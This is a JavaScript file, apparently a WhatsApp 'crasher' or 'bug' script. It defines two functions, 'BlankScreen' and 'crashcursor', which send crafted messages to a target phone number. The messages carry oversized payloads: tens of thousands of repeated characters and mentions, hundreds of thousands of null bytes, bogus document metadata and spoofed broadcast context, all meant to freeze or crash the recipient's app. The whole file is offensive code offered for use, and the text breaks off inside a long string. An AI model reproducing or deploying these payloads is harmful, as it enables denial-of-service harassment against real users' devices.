const crypto = require('crypto');

async function BlankScreen(sock, target, ptcp = false) {
        let virtex =
          "Silvetras Crasher͟" + "ꦽ".repeat(45000) + "@13135550002".repeat(50000);
        await sock.relayMessage(
          target,
          {
            ephemeralMessage: {
              message: {
                interactiveMessage: {
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                      fileName: "Halo🤗",
                      fileEncSha256:
                        "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                      directPath:
                        "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1726867151",
                      contactVcard: true,
                      jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                    },
                    hasMediaAttachment: true,
                  },
                  body: {
                    text: virtex,
                  },
                  nativeFlowMessage: {
                    name: "call_permission_request",
                    messageParamsJson: "\u0000".repeat(5000),
                  },
                  contextInfo: {
                    mentionedJid: ["13135550002@s.whatsapp.net"],
                    forwardingScore: 1,
                    isForwarded: true,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    quotedMessage: {
                      documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                        mimetype:
                          "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256:
                          "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                        fileLength: "9999999999999",
                        pageCount: 1316134911,
                        mediaKey:
                          "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                        fileName: "Bokep 18+",
                        fileEncSha256:
                          "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                        directPath:
                          "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1724474503",
                        contactVcard: true,
                        thumbnailDirectPath:
                          "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                        thumbnailSha256:
                          "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                        thumbnailEncSha256:
                          "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                        jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                      },
                    },
                  },
                },
              },
            },
          },
          ptcp
            ? {
                participant: {
                  jid: target,
                },
              }
            : {},
        );
        console.log("🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿");
      }


async function crashcursor(sock, target, ptcp = false) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Assalamu'alaikum " + "ꦽ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮⩟⬦𪲁 ͢𝐀͠𝐗͜-𝗷𝗮͟",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "⩟⬦𪲁⚡𝗢𝘇𝘇𝘆𝗗𝗲𝘃4𝗬𝗼𝘂〤- ̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̷̡̢̢̢̢̢̡̢̢̨̧̛̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕̕̕̚̕͘̚̚͘͜͜͜͝͠͠͝͝͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ" 
                    },
                    contentText: "- Kami Yo \"👋\" " + "‎ ‎ ‎ ‎ ‎ ‎ ".repeat(9999),
                    footerText: "© Silvetrasz ⩟⬦𪲁 ͢𝐀͠𝐗͜-",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "🌸 Silvetrasz  ̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̷̡̢̢̢̢̢̡̢̢̨̧̛̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕̕̕̚̕͘̚̚͘͜͜͜͝͠͠͝͝͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅ